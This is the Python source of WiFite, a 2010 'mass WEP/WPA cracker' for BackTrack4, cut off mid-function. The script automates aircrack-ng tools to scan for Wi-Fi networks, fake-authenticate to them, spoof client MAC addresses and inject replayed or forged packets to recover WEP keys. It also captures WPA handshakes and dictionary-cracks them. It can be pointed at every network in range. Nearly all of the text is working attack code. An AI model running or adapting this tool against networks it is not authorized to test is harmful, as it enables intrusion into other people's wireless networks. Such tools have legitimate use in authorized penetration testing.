#!/usr/bin/python


""" WIFITE
    (c) 2010 derv merkler
"""

""" TODO LIST:
    -test endless (WPA_MAXWAIT=0 or WEP_MAXWAIT=0)
    -test SKA (my router won't allow it, broken SKA everytime)
    -in WPA: scan for new clients, add to 'deauth' list, cycle through list
"""

import string, sys            # basic stuff
import os, signal, subprocess # needed for shells, sending commands, etc
import time                   # need to pause, track how long methods take
import re                     # reg-ex: for replacing

# default wireless interface (blank to prompt)
IFACE=''

# default wpa-cracking password list (blank to prompt)
DICT=''

# default essid to attack
ESSID=''

# WPA constants
WPA=True
WPA_TIMEOUT=3.0
WPA_MAXWAIT=300 # change maxwait with -wpaw arg

# WEP constants
WEP=True
WEP_PPS    =400
WEP_MAXWAIT=600 # change maxwait with -wepw arg
WEP_ARP    =True
WEP_CHOP   =True
WEP_FRAG   =True
WEP_P0841  =True
AUTOCRACK  =5000
CHANGE_MAC =False

# never really display these to the user, hmm...
ATTEMPTS=0
CRACKED =0

# default channel (0 checks all channels)
CHANNEL='0'

# assorted lists for storing data
TARGETS  =[]
CLIENTS  ={} # dictionary type! for fast[er] client look-up
ATTACK   =[]
WPA_CRACK=[]
THE_LOG  =[]

SKIP_TO_WPA=False

THIS_MAC=''
OLD_MAC =''

# COLORS
W  = "\033[0m";  # white (normal)
BLA= "\033[30m"; # black
R  = "\033[31m"; # red
G  = "\033[32m"; # green
O  = "\033[33m"; # orange
B  = "\033[34m"; # blue
P  = "\033[35m"; # purple
C  = "\033[36m"; # cyan
GR = "\033[37m"; # gray

############################################################################### main
def main():
	""" where the magic happens """
	global IFACE, ATTACK, DICT, THIS_MAC, SKIP_TO_WPA
	
	try:
		# print banner
		#print '\n     wifite.py; wep/wpa cracker\n'
		banner()
		
		if not check_root():
			print R+'[+] must be run as '+O+'root'+O+'!'
			print R+'[+] type '+O+'su'+R+' to login as root'
			print R+'[+] the program will now exit'
			print W
			sys.exit(0)
		
		# handle arguments
		if len(sys.argv) > 1:
			handle_args(sys.argv)
			print ''
		else:
			print GR+'[+] '+W+'include '+G+'-help'+W+' for more options\n'
			time.sleep(1)
		
		# find/get wireless interface if there isn't one provided
		if IFACE == '':
			find_mon()
		
		# get the current mac address for IFACE
		THIS_MAC = getmac()
		
		# find and display all current targets to user
		gettargets()
		
		# user has selected which APs to attack
		
		# check if we need a dictionary
		dict_check() # get dictionary from user if need be
		
		for x in ATTACK:
			attack(x - 1) # subtract one because arrays start at 0
			
			# if user breaks during an attack and wants to skip to cracking...
			if SKIP_TO_WPA:
				break
		
		
		if len(WPA_CRACK) > 0 and DICT != '':
			# we have wpa handshakes to crack!
			# format is ['filename', 'ssid']
			for i in xrange(0, len(WPA_CRACK)):
				wpa_crack(i)
				pass
		
		if len(ATTACK) == 1:
			print GR+'[+] '+W+'the attack is '+G+'complete'+W+';',
		else:
			print GR+'[+] '+W+'the attacks are '+G+'complete'+W+';',
		
		if len(THE_LOG) > 0:
			print G+'session summary:'+W
			for i in THE_LOG:
				print i
			
		else:
			print R+'exiting'+W
		
	except KeyboardInterrupt:
		print GR+'\n[!] '+O+'^C interrupt received, '+R+'exiting'+W
		

############################################################################### banner
def banner():
	""" displays the pretty app logo + text  """
	print ''
	print G+"  .;'                     `;,    "
	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite"
	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"mass WEP/WPA cracker"
	print G+"':.  ':.  ':. "+GR+"/ \\"+G+" ,:'  ,:'  ,:'  "
	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"designed for backtrack4"
	print G+"  ':.       "+GR+"/_____\\"+G+"      ,:'     "
	print G+"           "+GR+"/       \\"+G+"             "
	print W


def check_root():
	""" returns True if user is root, false otherwise """
	if os.getenv('LOGNAME','none').lower() == 'root':
			return True
	return False

############################################################################### handle args
def handle_args(args):
	""" handles arguments, sets global variables if specified """
	global IFACE, WEP, WPA, CHANNEL, ESSID, DICT, WPA_MAXWAIT, WEP_MAXWAIT
	global W, BLA, R, G, O, B, P, C, GR # colors!
	
	# first loop, finds '-no-color' and '-help', in case the user wants to use these!
	for a in args:
		#nocolor
		if a == '-no-color' or a == '--no-color':
			# no colors, blank out the colors
			W  = ""
			BLA= ""
			R  = ""
			G  = ""
			O  = ""
			B  = ""
			P  = ""
			C  = ""
			GR = ""
			print '[+] colors have been neutralized :)'
			
		#HELP
		elif a == 'h' or a == 'help' or a == '-h':
			halp()
			sys.exit(0)
		elif a == '--help' or a == '-help':
			halp(True)
			sys.exit(0)
	
	# second loop, for hte other options
	i = 0
	while (i < len(args)):
		a = args[i]
		
		if a == '-i' or a == '--iface':
			try:
				IFACE=args[i+1]
				print GR+'[+] '+W+'using wireless interface "'+G + IFACE + W+'"'
			except IndexError:
				print R+'[!] error! invalid argument format'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			
			i+=1
			
		elif a == '-c' or a == '--chan':
			try:
				CHANNEL=args[i+1]
				print GR+'[+] '+W+'only looking for networks on "'+G + CHANNEL + W+'"'
			except IndexError:
				print R+'[!] error! invalid argument format'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i+=1
			
		elif a == '-e' or a == '--essid':
			try:
				ESSID=args[i+1]
				if ESSID.lower() == 'all' or ESSID.lower() == '"all"':
					if ESSID.startswith('pow>'):
						print O+'[!] already targeting essids with power greater than '+ESSID[4:]+'dB'+W
					else:
						ESSID = 'all'
						print GR+'[+] '+W+'targeting essid "'+G + ESSID + W+'"'
			except IndexError:
				print R+'[!] error! invalid argument format'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i+=1
			
		elif a == '-all' or a == '--all':
			if ESSID.startswith('pow>'):
				print O+'[!] already targeting essids with power greater than '+ESSID[4:]+'dB'+W
			else:
				ESSID = 'all'
				print GR+'[+] '+W+'targeting essid "'+G + ESSID + W+'"'
			
		elif a == '-p' or a == '--power':
			try:
				tempint=int(args[i+1])
			except IndexError:
				print R+'[!] error! invalid argument format'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			except ValueError:
				print R+'[!] invalid power level!'
				print R+'[!] enter -e pow>## where ## is a 1 or 2 digit number'
				print R+'[!] example: ./wifite.py -e pow>55'
				print W
				sys.exit(0)
			
			print GR+'[+] '+W+'targeting networks with signal power greater than '+G+ str(tempint)+'dB'+W
			ESSID='pow>'+str(tempint)
			
		elif a == '-d' or a == '--dict' or a == '-dict':
			try:
				DICT=args[i+1]
				print GR+'[+] '+W+'using dictionary "'+G + DICT + W+'"'
			except IndexError:
				print R+'[!] error! invalid argument format'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i+=1
			
		elif a == '-nowpa' or a == '--no-wpa':
			print GR+'[+] '+W+'only scanning for '+G+'WEP-encrypted networks'+W
			WPA=False
			
		elif a == '-nowep' or a == '--no-wep':
			print GR+'[+] '+W+'only scanning for '+G+'WPA-encrypted networks'+W
			WEP=False
		
		elif a == '-wpaw' or a == '--wpa-wait':
			try:
				WPA_MAXWAIT=int(args[i+1])*60
				print GR+'[+] '+W+'set wpa handshake wait time:',
				if WPA_MAXWAIT == 0:
					print G+'unlimited'
				else:
					print G+str(WPA_MAXWAIT/60)+' minutes'
				
			except Exception:
				print R+'[!] error! invalid arguments'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i=i+1
			
		elif a == '-wepw' or a == '--wep-wait':
			try:
				WEP_MAXWAIT=int(args[i+1])*60
				print GR+'[+] '+W+'set wep attack wait time:',
				if WEP_MAXWAIT == 0:
					print G+'unlimited'
				else:
					print G+str(WEP_MAXWAIT/60)+' minutes'
			except Exception:
				print R+'[!] error! invalid arguments'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i=i+1
		
		elif a == '-pps' or a == '--pps':
			try:
				WEP_PPS=int(args[i+1])
				print GR+'[+] '+W+'set WEP replay pps: '+G+str(WEP_PPS)+'/sec'
			except Exception:
				print R+'[!] error! invalid arguments'
				print R+'[!] the program will now exit'
				print W
				sys.exit(0)
			i=i+1
		
		elif a == '-mac' or a == '--change-mac':
			CHANGE_MAC=True
			print GR+'[+] '+W+'change mac during WEP attack '+G+'enabled'+W
		
		i += 1
		
	if WEP==False and WPA==False:
		print R+'[!] error! both WPA and WEP are diabled!'
		print R+'[!] those are the only two kinds of networks this program can attack'
		print R+'[!] program will exit now'
		print W
		sys.exit(0)

############################################################################### logit
def logit(txt):
	"""saves txt to both file log and list log"""
	THE_LOG.append(txt)
	f = open('log.txt', 'a')
	f.write(txt +'\n')
	f.close()

############################################################################### halp
def halp(full=False):
	""" displays the help screen 
		if full=True, prints the full help (detailed info)
	"""
	print GR+'Usage: '+W+'python wifite.py '+G+'[SETTINGS] [FILTERS]\n'
	
	if not full:
		print G+'  -help, --help\t'+GR+'display the full help screen\n'
	
	print GR+'  SETTINGS'
	#IFACE
	if full:
		print G+'  -i, --iface\t'+GR+'     e.g. -i wlan0'
		print '             \t wireless interface'
		print '             \t the program automatically selects a wifi device in monitor mode'
		print '             \t prompts for input if no monitor-mode devices are found\n'
	else:
		print G+'  -i\t\t'+GR+'wireless interface'
	#DICT
	if full:
		print G+'  -d, --dict\t'+GR+'     e.g. -d /pentest/passwords/wordlists/darkc0de.lst'
		print '             \t dictionary file for WPA cracking'
		print '             \t the program will prompt for a dictionary file if any WPA targets'
		print '             \t are selected for attack. using -d avoids this prompt'
		print '             \t e.g. -d "none"'
		print '             \t does not attempt to crack WPA handshakes, only captures and stores them\n'
	else:
		print G+'  -d\t\t'+GR+'dictionary file, for WPA handshake cracking'
	#WPAWAIT
	if full:
		print G+'  --wpa-wait\t'+GR+'     e.g. -wpaw 15'
		print '          \t sets the maximum time to wait for a wpa handshake (in minutes)'
		print '          \t enter "0" to wait endlessly\n'
	else:
		print G+'  -wpaw\t\t'+GR+'time to wait for wpa handshake (in minutes)'
	#WEPWAIT
	if full:
		print G+'  --wep-wait\t'+GR+'     e.g. -wepw 10'
		print '          \t sets the maximum time to wait for each WEP attack.'
		print '          \t depending on the settings, this could take a long time'
		print '          \t if the wait is "10 minutes", then EACH METHOD of attack gets 10 minutes'
		print '          \t if you have all 4 attacks (arp, frag, chop, 0841), it would take 40 minutes'
		print '          \t enter "0" to wait endlessly\n'
	else:
		print G+'  -wepw\t\t'+GR+'max time (in minutes) to capture/crack WEP key of each access point'
	#PPS
	if full:
		print G+'  --pps\t\t'+GR+'     e.g. -pps 400'
		print '          \t packets-per-second (used only by WEP attacks) - larger pps means more ivs'
		print '          \t however, smaller pps is recommended for weaker access points (or far-away APs)\n'
		
	else:
		print G+'  -pps\t\t'+GR+'packets-per-second (for WEP replay attacks)'
	#CHANGE_MAC
	if full:
		print G+'  --change-mac\t'+GR+' chanes mac address of interface to a client\'s mac (if found)'
		print '          \t only affects WEP-based attacks\n'
		
	else:
		print G+'  -mac\t\t'+GR+'for WEP attacks only: change mac address to client\'s mac (if found)'
	
	#NO COLORS
	if full:
		print G+'  --no-color\t '+GR+'do not display annoying colors (use system colors)\n'
	else:
		print G+'  -no-color\t'+GR+'do not use colored text (use system colors)'
	
	
	print GR+'\n  FILTERS'
	#ESSID
	if full:
		print G+'  -e, --essid\t'+GR+'     e.g. -e "2WIRE759"'
		print '             \t essid (name) of the access point (router)'
		print '             \t this forces a narrowed attack; no other networks will be attacked\n'
		#print '             \t     e.g. -e "all"'
		#print '             \t using the essid "all" results in every network'
		#print '             \t being targeted and attacked. this is not recommended'
		#print '             \t because most attacks are useless from far away!\n'
	else:
		print G+'  -e\t\t'+GR+'ssid (name) of the access point you want to attack'
	#ALL
	if full:
		print G+'  -all, --all\t'+GR+' target and attack all access points found'
		print '           \t this is dangerous because most attacks require injection, and most'
		print '           \t wireless cards cannot inject unless they are close to the router\n'
	else:
		print G+'  -all\t\t'+GR+'target and attack access points found'
	#POWER
	if full:
		print G+'  -p, --power\t'+GR+'     e.g. -p 55'
		print '             \t minimum power level (dB)'
		print '             \t this is similar to the "-e all" option, except it filters'
		print '             \t access points that are too far away for the attacks to be useful\n'
	else:
		print G+'  -p\t\t'+GR+'filters minimum power level (dB) to attack; ignores lower levels'
	#CHANNEL
	if full:
		print G+'  -c, --channel\t'+GR+'     e.g. -c 6'
		print '               \t channel to scan'
		print '               \t not using this option causes program to search all possible channels'
		print '               \t only use -c or --channel if you know the channel you want to listen on\n'
	else:
		print G+'  -c\t\t'+GR+'channel to scan (default is all channels)'
	#NOWPA
	if full:
		print G+'  --no-wpa\t'+GR+' ignores all WPA-encrypted networks'
		print '          \t useful when using --power or "-e all" attacks\n'
	else:
		print G+'  -nowpa\t'+GR+'do NOT scan for WPA (default is on)'
	#NOWEP
	if full:
		print G+'  --no-wep\t'+GR+' ignores all WEP-encrypted networks'
		print '          \t useful when using filtered attacks like -p or "-e all"\n'
	else:
		print G+'  -nowep\t'+GR+'do NOT scan for WEP (default is on)'
	
############################################################################### find_mon	
def find_mon():
	"""
	finds any wireless devices running in monitor mode
	if no monitor-mode devices are found, it asks for a device to put into monitor mode
	if only one monitor-mode device is found, it is used
	if multiple monitor-mode devices are found, it asks to pick one
	"""
	global IFACE
	
	ifaces=[]
	print GR+'[+] '+W+'searching for devices in monitor mode...'
	proc=subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	txt=proc.communicate()[0]
	lines=txt.split('\n')
	for line in lines:
		if line.find('Mode:Monitor') != -1:
			ifaces.append(line[0:line.find(' ')])
	
	if len(ifaces) == 0:
		print GR+'[!] '+O+'no wireless interfaces are in monitor mode!'
		proc=subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
		txt=proc.communicate()[0]
		lines=txt.split('\n')
		poss=[]
		
		for line in lines:
			if line != '' and line.find('Interface') == -1:
				poss.append(line)
		
		if len(poss) == 0:
			print R+'[!] no devices are capable of monitor mode!'
			print R+'[!] perhaps you need to install new drivers'
			print R+'[+] this program will now exit.'
			print W
			sys.exit(0)
		else:
			print GR+'\n[+] '+W+'select which device you want to put into monitor mode:'
			for p in xrange(0, len(poss)):
				print '      '+G + str(p + 1) + W+'. ' + poss[p]
			
			err=True
			while err==True:
				try:
					print GR+'[+] '+W+'select the wifi interface (between '+G+'1'+W+' and '+G + str(len(poss)) + W+'):'+G,
					num=int(raw_input())
					if num >= 1 and num <= len(poss):
						err=False
				except ValueError:
					err=True
			poss[num-1] = poss[num-1][:poss[num-1].find('\t')]
			print GR+'[+] '+W+'putting "'+G + poss[num-1] + W+'" into monitor mode...'
			subprocess.call(['airmon-ng','start',poss[num-1]], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			find_mon()  # recursive call
			return
			
	elif len(ifaces) == 1:
		IFACE=ifaces[0] # only one interface in monitor mode, we know which one it is
	else:
		pass
	print GR+'[+] '+W+'using interface "'+G+ IFACE +W+'"\n'

############################################################################### getmac()
def getmac():
	""" returns the MAC address of the current interface """
	global IFACE
	
	proc_mac = subprocess.Popen(['ifconfig',IFACE], stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	proc_mac.wait()
	lines = proc_mac.communicate()[0]
	if lines == None:
		return 'NO MAC'
	
	for line in lines:
		line = lines.split('\n')[0]
		line=line[line.find('HWaddr ')+7:]
		if line.find('-') != -1:
			macnum=line.split('-')
			mac=''
			for i in xrange(0, len(macnum)):
				mac=mac+macnum[i]
				if i < 5:
					mac=mac+':'
				else:
					break
			return mac
		else:
			return line.strip()

############################################################################### wpa_crack
def wpa_crack(index):
	"""
		index = the index of WPA_CRACK list we are cracking
		as we grab handshakes during the inital attacks, the handshakes are stored in WPA_CRACK
		this opens aircrack (in the background) and tries to crack the WPA handshakes
		i don't have a way to get the # of tries per second or total, so it just outputs "cracking" every 5 seconds
		maybe it could do something else...
	"""
	global DICT, WPA_CRACK
	
	filename=WPA_CRACK[index][0]
	ssid    =WPA_CRACK[index][1]
	
	print GR+'['+sec2hms(0)+'] '+W+'started cracking WPA key for "'+G + ssid + W+'";',
	
	# calculate number of passwords we will try
	proc_pmk=subprocess.Popen(['wc','-l',DICT], stdout=subprocess.PIPE, stderr=open(os.devnull,'w'))
	txt=proc_pmk.communicate()[0]
	if txt != None:
		txt=txt.strip().split(' ')[0]
		if txt != '':
			total_pmks=int(txt.strip())
			print 'using '+G+DICT+W+' ('+G + txt +' passwords'+W+')'
	else:
		total_pmks=0
		print ''
	
	cracked=''
	proc_crack=''
	START_TIME=time.time()
	
	try:
		subprocess.call(['rm','-rf','wpakey.txt','crackout.tmp'])
		time.sleep(0.1)
		
		cmd = 'aircrack-ng -a 2 -w '+DICT+' -l wpakey.txt '+filename+' >> crackout.tmp'
		proc_crack = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), shell=True)
		while (proc_crack.poll() == None):
			time.sleep(1)
			print '\r'+GR+'['+sec2hms(time.time() - START_TIME)+'] '+W+'cracking;',
			f=open('crackout.tmp')
			txt=f.read()
			if txt != '' and txt != None:
				ks=''
				
				# find the keys per second
				last=txt.rfind(' k/s)')
				first=txt.rfind('(')
				if last != -1 and first != -1:
					first+=1
					ks=txt[first:last]
					print G+str(ks)+W+' k/s;',
					
					# find the total keys
					last=txt.rfind(' keys tested')
					first=txt.rfind('] ')
					if last != -1 and first != -1:
						first+=2
						pmks=txt[first:last]
						print G+str(pmks)+W+' keys total;',
						if total_pmks != 0 and pmks != '':
							print G+str(int(pmks) * 100 / total_pmks) + '%'+W,
					
					# find the ETA
					if ks.find('.') != -1 and pmks != '':
						kps=int(ks[:ks.find('.')])
						if kps > 0:
							eta=int((total_pmks - int(pmks)) / kps)
							print 'eta: ' + C+sec2hms(eta),
					print '     '+W,
			sys.stdout.flush()
			
			# wipe the aircrack output file (keep it from getting too big)
			subprocess.call('echo "" > crackout.tmp',shell=True)
			
		if os.path.exists('wpakey.txt'):
			f = open('wpakey.txt','r')
			cracked=f.readlines()[0]
			print '\n'+GR+'['+sec2hms(time.time()-START_TIME)+'] '+G+'cracked "' + ssid + '"! the key is: "'+C+cracked+G+'"'
			logit(datetime()+' cracked "' + ssid + '"! the key is "' + cracked + '"')
			
		else:
			print GR+'\n['+sec2hms(time.time()-START_TIME)+'] '+W+'wordlist crack complete; '+O+'WPA key for "' + ssid + '" was not found in the dictionary'
		
	except KeyboardInterrupt:
		print R+'\n\n['+sec2hms(time.time()-START_TIME)+'] '+O+'cracking interrupted'+W
		# check if there's other files to crack (i < len(WPA_CRACK))
		# if there are, ask if they want to start cracking the next handshake, or exit
		
	try:
		os.kill(proc_crack.pid, signal.SIGTERM)
	except OSError:
		pass
	except UnboundLocalError:
		pass
	# for some reason (maybe the stream pointer?) aircrack doesn't stay dead.
	subprocess.call(['killall','aircrack-ng'], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
	
	# remove the temp file
	subprocess.call(['rm','-rf','crackout.tmp'])

############################################################################### dict_check
def dict_check():
	""" checks if user has specified a dictionary
		if not, it checks the current ATTACK list for any targets that may be WPA
		if it finds any WPA, it immediately prompts the user for a dictionary
		user has the option to ctrl+C or type 'none' to avoid cracking
	"""
	global DICT, ATTACK, TARGETS
	if DICT == '':
		for x in ATTACK:
			if TARGETS[x-1][2].startswith('WPA'):
				# we don't have a dictionary and the user wants to crack WPA
				print GR+'\n[+] '+W+'in order to crack WPA, you will need to '+O+'enter a dictionary file'
				ent = 'blahnotafile'
				try:
					while 1:
						print GR+'[+] '+W+'enter the path to the dictionary to use, or "'+G+'none'+W+'" to not crack at all:'
						ent = raw_input()
						if ent == 'none' or ent == '"none"':
							break
						elif not os.path.exists(ent):
							print R+'[!] error! path not found: '+O+ent+R+'; please try again\n'
						else:
							DICT=ent
							print GR+'[+] '+W+'using "'+G+DICT+W+'" as wpa wordlist dictionary'
							break
					
				except KeyboardInterrupt:
					print GR+'\n[+] '+W+'no dictionary file entered; continuing anyway'
					
				break

############################################################################### attack
def attack(index):
	""" checks if target is WPA or WEP, forwards to the proper method """
	print GR+'\n[+] '+W+'attacking "'+G + TARGETS[index][8] + W+'"...'
	if TARGETS[index][2].startswith('WPA'):
		attack_wpa(index)
	elif TARGETS[index][2] == 'WEP':
		attack_wep_all(index)
	else:
		print R+'\n[!] unknown encryption type: '+O + TARGETS[index][2] + R+'\n'

############################################################################### is_shared
def is_shared(index):
	""" uses aireplay fake-auth to determine if an AP uses SKA or not
		returns True if AP uses SKA, False otherwise """
	global TARGETS, IFACE
	cmd=['aireplay-ng','-1','0',TARGETS[index][0],'-T','1',IFACE]
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	txt=proc.communicate()[0]
	if txt == None:
		return False
	elif txt.lower().find('shared key auth') != -1:
		return True
	else:
		return False
	
	############################################################################### attack_wep_all
def attack_wep_all(index):
	""" attacks target using all wep attack methods """
	global TARGETS, CLIENTS, IFACE, WEP_MAXWAIT, WEP_PPS
	global THIS_MAC, WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841
	global AUTOCRACK, ATTEMPTS, CRACKED, OLD_MAC
	
	# to keep track of how long we are taking
	TIME_START=time.time()
	
	# set up lists so we can run all attacks in this method
	weps   =[WEP_ARP,      WEP_CHOP,    WEP_FRAG,    WEP_P0841]
	wepname=['arp replay','chop-chop','fragmentation','-p0841']
	
	# if there's no selected attacks, stop
	if weps[0]==False and weps[1]==False and weps[2]==False and weps[3]==False:
		print R+'[!] no wep attacks are selected; unable to attack!'
		print R+'[!] edit wifite.py so these are equal to True: WEP_ARP, WEP_FRAG, WEP_CHOP, WEP_P0841'
		print W
		return
	
	ATTEMPTS+=1 # global counter
	
	# flags
	stop_attack=False
	started_crack=False
	EXIT_PROGRAM=False
	
	OLD_MAC=''
	# set the client to a client, or this mac address if there's no clients
	client=CLIENTS.get(TARGETS[index][0], THIS_MAC)
	
	# kill all backup IVS files... just in case
	subprocess.call('rm -rf wep-*.ivs', shell=True)
	#subprocess.call('rm -rf wep-*.cap', shell=True)
	
	# delete airodump log files
	subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
	subprocess.call(['rm','-rf','wepkey.txt'])
	time.sleep(0.1)
	
	# open airodump to capture packets
	cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
			'--output-format','csv,ivs',IFACE]
	proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
	
	try:
		# if we don't have a client, OR it's using SKA (have to fake-auth anyway)
		if client == THIS_MAC or is_shared(index) or CHANGE_MAC == False:
			# fake-authenticate with the router
			faked=False
			for i in xrange(1, 4):
				time.sleep(1)
				
				print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'attempting fake-authentication (attempt '+str(i)+'/3)',
				sys.stdout.flush()
				time.sleep(0.3)
				faked=attack_fakeauth(index)
				if faked:
					break
			
			if faked:
				# fake auth was successful
				print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'fake authentication successful :)'
				if CHANGE_MAC == False:
					client=THIS_MAC
			else:
				# fake auth was unsuccessful (SKA?)
				print GR+'\n['+get_time(WEP_MAXWAIT, TIME_START)+'] '+R+'fake authentication unsuccessful :('
		else:
			# if we have a client and it's not SKA, we can just change our MAC
			
			# kill airodump, we can't change our MAC while airodump is running
			try:
				os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
			except OSError:
				pass
			except UnboundLocalError:
				pass
			subprocess.call(['killall','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
			
			# change mac from OLD_MAC to 'client'
			OLD_MAC = THIS_MAC
			print GR+'['+get_time(WEP_MAXWAIT, TIME_START)+'] '+W+'changing mac to '+GR+ client.lower() +W+'...'
			subprocess.call(['ifconfig',IFACE,'down'])
			subprocess.call(['macchanger','-m',client,IFACE], stdout=open(os.devnull,'w'))
			subprocess.call(['ifconfig',IFACE,'up'])
			print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'changed mac; continuing attack'
			time.sleep(0.3)
			
			# delete airodump log files
			subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
			subprocess.call(['rm','-rf','wepkey.txt'])
			time.sleep(0.1)
			
			# start airodump again!
			cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],'--output-format','csv,ivs',IFACE]
			proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			time.sleep(0.3)
			
			# should we fake-auth after spoofing a client's mac address?
			#if attack_fakeauth(index):
			#	print '['+get_time(WEP_MAXWAIT, TIME_START)+'] fake authentication successful :)'
			#else:
			#	print '['+get_time(WEP_MAXWAIT, TIME_START)+'] fake authentication unsuccessful :('
			
	except KeyboardInterrupt:
		# user interrupted during fakeauth
		subprocess.call(['killall','aireplay-ng','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
		print R+'\n[!] ^C interrupt received'
		
		# show menu!
		menu=G+'   [c]ontinue with this attack ("'+TARGETS[index][8]+'")\n'
		opts=G+'c'+W
		# check if there's other targets to attack
		for i in xrange(0,len(ATTACK)):
			if index==ATTACK[i]-1:
				if i < len(ATTACK) - 1:
					# more to come
					opts+=', '+G+'n'+W
					if i == len(ATTACK)-2:
						menu=menu+G+'   [n]ext attack (there is 1 target remaining)\n'
					else:
						menu=menu+G+'   [n]ext attack (there are '+str(len(ATTACK)-i-1)+' targets remaining)\n'
					break
		
		if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
			if opts != '':
				opts+=','
			opts+=O+'s'+W
			if len(WPA_CRACK) == 1:
				menu=menu+O+'   [s]kip to the WPA cracking (you have 1 handshake to crack)\n'
			else:
				menu=menu+O+'   [s]kip to the WPA cracking (you have '+str(len(WPA_CRACK))+' handshakes to crack)\n'
		
		if menu!= '':
			opts+=', or '+R+'e'+W
			
			menu=menu+R+'   [e]xit the program completely'
			
			print GR+'\n[+] '+W+'please select a menu option below:'
			print menu
			print GR+'[+] '+W+'enter option ('+opts+'):'+W,
			typed=raw_input()
			
			if typed=='c':
				# start airodump and do nothing (the rest will start)
				# delete airodump log files
				subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
				subprocess.call(['rm','-rf','wepkey.txt'])
				time.sleep(0.1)
				
				# start airodump again!
				cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0], \
						'--output-format','csv,ivs',IFACE]
				proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
				time.sleep(0.3)
				
			elif typed=='n':
				# return, takes us out and we can start the next attack
				return
			
			elif typed == 's':
				# skip to WPA cracking!
				SKIP_TO_WPA=True
				return
			
			else:
				EXIT_PROGRAM=True
				return
			
		else:
			# no reason to keep running! gtfo
			return
	# end of try: around fake auth
	
	# keep track of all the IVS captured
	total_ivs=0
	
	# loop through every WEP attack method
	for wepnum in xrange(0, len(weps)):
		if weps[wepnum]==True:
			# reset the timer for each attack
			TIME_START=time.time()
			
			print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+ \
				'] '+W+'started '+GR+wepname[wepnum]+' attack'+W+' on "'+G+TARGETS[index][8]+W+'"'#; Ctrl+C for options'
			
			# remove any .xor and replay files
			subprocess.call('rm -rf replay_arp-*.cap *.xor',shell=True)
			time.sleep(0.1)
			
			if wepnum==0:
				cmd=['aireplay-ng','-3','-b',TARGETS[index][0],'-h',client,'-x',str(WEP_PPS),IFACE]
			elif wepnum==1:
				cmd=['aireplay-ng','-4','-b',TARGETS[index][0],'-h',client,'-m','100','-F','-x',str(WEP_PPS),IFACE]
			elif wepnum==2:
				cmd=['aireplay-ng','-5','-b',TARGETS[index][0],'-h',client,'-m','100','-F','-x',str(WEP_PPS),IFACE]
			elif wepnum==3:
				cmd=['aireplay-ng','-2','-b',TARGETS[index][0],'-h',client,'-T','1','-F','-p','0841',IFACE]
			
			proc_replay = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			
			# chopchop and frag both require replaying the arp packet, this flag lets us know when
			replaying=False
			
			# keep track of how many IVS we've captured, so we don't print every 5 seconds endlessly
			oldivs=-1
			while (time.time() - TIME_START) < WEP_MAXWAIT or WEP_MAXWAIT == 0:
				try:
					if proc_replay.poll() != None: # and wepnum != 0 and wepnum != 3:
						# the attack stopped, it's not arp-replay or p0841 (chopchop/frag)
						if wepnum == 0 or wepnum == 3:
							print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+wepname[wepnum]+' attack failed'
							break
						
						# look if a .xor file was created...
						proc_replay = subprocess.Popen('ls *.xor', stdout=subprocess.PIPE, \
											stderr=open(os.devnull, 'w'), shell=True)
						xor_file=proc_replay.communicate()[0].strip()
						if xor_file == '':
							# no xor file, we have failed!
							print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] attack failed; '+O+'unable to generate keystream'
							break
						
						else:
							# we have a .xor file, time to generate+replay
							xor_file=xor_file.split('\n')[0]
							
							# remove arp.cap, so we don't have over-write issues
							subprocess.call(['rm','-rf','arp.cap'])
							time.sleep(0.1)
							
							print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+ \
									   '] '+G+'produced keystream, '+O+'forging with packetforge-ng...'
							
							cmd=['packetforge-ng','-0','-a',TARGETS[index][0],'-h',client,\
